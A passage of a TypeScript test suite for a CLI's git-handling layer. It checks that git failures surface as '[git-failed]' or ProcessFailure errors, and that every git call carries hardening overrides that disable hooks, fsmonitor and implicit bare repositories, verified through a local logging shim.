        process.execPath,
        [cliPath, "digest", spec, "--repo", repo],
        { cwd: scratch, env: { ...process.env, PATH: killingGit(needle) } },
      );
      expect(run.code, needle).toBe(1);
      expect(run.stdout, needle).toBe("");
      expect(run.stderr, needle).toContain("[git-failed]");
      expect(run.stderr, needle).not.toContain("[commands-ref-unresolvable]");
      expect(run.stderr, needle).not.toContain("[repo-invalid]");
    }
  });

  it("is a ProcessFailure in intake, never a non-zero status the caller reads as a refusal", async () => {
    const { repo } = await goldenRepo();
    process.env["PATH"] = killingGit("rev-parse");
    await expect(runGit(repo, ["rev-parse", "HEAD"])).rejects.toMatchObject({
      name: "ProcessFailure",
      kind: "signal",
    });
  });
});

describe("intake keeps the transports of a configured remote", () => {
  const saved = process.env["PATH"];
  afterEach(() => {
    process.env["PATH"] = saved;
  });

  it("its calls carry the three overrides and not protocol.allow", async () => {
    const dir = fs.mkdtempSync(path.join(scratch, "shim-"));
    const log = path.join(dir, "calls.log");
    const real = fs.realpathSync(
      ["/usr/bin/git", "/opt/homebrew/bin/git", "/usr/local/bin/git"].find(
        (p) => fs.existsSync(p),
      )!,
    );
    fs.writeFileSync(
      path.join(dir, "git"),
      `#!/bin/sh\nprintf '%s\\n' "$*" >> "${log}"\nexec "${real}" "$@"\n`,
      { mode: 0o755 },
    );
    const { repo } = await goldenRepo();
    process.env["PATH"] = `${dir}${path.delimiter}${saved ?? ""}`;
    await runGit(repo, ["rev-parse", "HEAD"]);
    const lines = fs.readFileSync(log, "utf8").trim().split("\n");
    expect(lines).toEqual([
      `-C ${repo} -c safe.bareRepository=explicit -c core.fsmonitor=false -c core.hooksPath=${os.devNull} rev-parse HEAD`,
    ]);
  });
});
